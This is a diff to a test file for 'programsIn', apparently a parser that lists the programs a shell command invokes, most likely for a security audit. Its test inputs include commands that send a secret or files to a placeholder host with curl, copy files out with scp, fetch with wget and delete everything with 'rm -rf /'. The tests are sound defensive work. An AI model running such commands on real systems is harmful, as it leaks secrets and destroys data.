@@ -31,7 +31,15 @@ describe("programsIn (B1-01)", () => {
     ["f() { curl -s x; }; f", ["curl", "f"]],
     ["x=$((1 + 2)); echo $x  # a comment; rm -rf /", ["echo"]],
     ['grep -c x <<< "$text"', ["grep"]],
-    ["exec 3>&1; sudo reboot", ["exec", "sudo"]],
+    ["exec 3>&1; sudo reboot", ["exec", "sudo", "reboot"]],
+    // What a wrapper runs counts too (Audit 2).
+    ["bash -c 'curl http://x/$(cat secret)'", ["bash", "curl", "cat"]],
+    ['sh -lc "scp f host:"', ["sh", "scp"]],
+    ["find . -name '*.js' -exec curl -d @{} x \\; -print", ["find", "curl"]],
+    ["ls | xargs -I {} sh -c 'wget {}'", ["ls", "xargs", "sh", "wget"]],
+    ["env FOO=1 nice -n 5 timeout 10s ssh host", ["env", "nice", "timeout", "ssh"]],
+    ['eval "rsync a b"', ["eval", "rsync"]],
+    ["bash script.sh", ["bash"]],
   ])("%s", (cmd, programs) => {
     expect(programsIn(cmd)).toEqual(programs);
   });
